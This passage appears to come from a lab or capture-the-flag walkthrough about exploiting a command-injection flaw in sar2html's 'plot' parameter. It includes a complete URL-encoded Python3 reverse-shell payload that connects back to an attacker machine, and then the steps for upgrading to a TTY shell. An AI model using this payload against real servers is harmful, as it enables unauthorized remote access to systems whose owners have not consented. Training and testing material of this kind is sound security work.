text: The discovery of <highlight>sar2html</highlight> in a hidden directory is the primary entry point. This application is vulnerable to <highlight>Remote Code Execution (RCE)</highlight> via the 'plot' parameter. By appending a semicolon followed by a system command to the URL, we can force the server to execute arbitrary bash commands as the <highlight>www-data</highlight> user.

We test for RCE by injecting a simple <highlight>id</highlight> or <highlight>pwd</highlight> command into the URL. If the server is vulnerable, the command output will appear within the 'Select Plot' dropdown menu or the page source.

Once RCE is confirmed, we use a <highlight>Python3</highlight> one-liner to establish a reverse connection back to our Kali machine. This provides a more stable interactive environment than the URL bar.

code:
# Injecting the Python3 Reverse Shell (URL Encoded)
index.php?plot=;python3%20-c%20'import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

text: Step 3: Upgrading to a TTY Shell
A standard netcat shell is 'dumb' (no tab-completion or arrow keys). We upgrade it to a full <highlight>TTY</highlight> shell using Python and terminal state manipulation.

code:
# Inside the netcat shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background, then:
stty raw -echo; fg

# Inside the shell again:
export TERM=xterm
